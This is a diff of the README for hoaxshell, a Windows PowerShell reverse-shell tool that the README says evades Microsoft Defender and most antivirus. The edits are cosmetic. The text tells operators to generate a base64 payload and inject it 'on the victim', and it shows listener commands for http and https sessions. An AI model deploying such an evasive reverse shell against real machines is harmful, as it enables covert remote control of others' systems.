@@ -6,7 +6,7 @@
 <img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">
 ## Purpose
 
-hoaxshell is a non-traditional windows reverse shell (powershell), currently undetected by Microsoft Defender and most other AV solutions, as it is solely based on http/https traffic. The tool is easy to use, it produces it's own powershell base64 encoded or raw payload, it supports session restoration and encryption (ssl).  
+hoaxshell is a non-traditional windows reverse shell (PowerShell), currently undetected by Microsoft Defender and most other AV solutions, as it is solely based on http/https traffic. The tool is easy to use, it produces it's own PowerShell base64 encoded or raw payload, it supports session restoration and encryption (ssl).  
   
 **Disclaimer**: The project is quite fresh and has not been widely tested.  
   
@@ -31,7 +31,7 @@ chmod +x hoaxshell.py
 ```
 sudo python3 hoaxshell.py -s <your_ip>
 ```  
-hoaxshell will generate the powershell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run powershell commands against it.
+hoaxshell will generate the PowerShell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.
 
 #### Encrypted shell session (https):
 ```
@@ -39,7 +39,7 @@ hoaxshell will generate the powershell payload automatically base64 encoded for 
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
 
 # Pass the cert.pem and key.pem as arguments:
-sudo python3 hoaxshell.py -s <your_ip> -c cert.pem -k key.pem
+sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
 
 ```  
 
@@ -48,6 +48,7 @@ In case you close your terminal accidentally, have a power outage or something, 
 ```
 sudo python3 hoaxshell.py -s <your_ip> -g
 ```  
+**Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).
 
 
 
